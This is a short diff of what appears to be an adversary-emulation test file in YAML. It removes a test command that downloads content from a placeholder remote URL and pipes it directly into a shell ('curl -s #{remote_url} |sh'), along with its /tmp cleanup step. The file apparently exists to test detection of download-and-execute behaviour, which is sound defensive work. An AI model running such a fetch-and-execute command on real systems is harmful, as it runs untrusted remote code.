@@ -323,11 +323,4 @@ atomic_tests:
     name: sh
     elevation_required: false
     command: |
-      cd /tmp
-      curl -s #{remote_url}
-      ls -la /tmp/art.txt
-      curl -s #{remote_url} |sh
-      ls -la /tmp/art.txt      
-    cleanup_command: |
-      rm /tmp/art.txt
       uname -srm
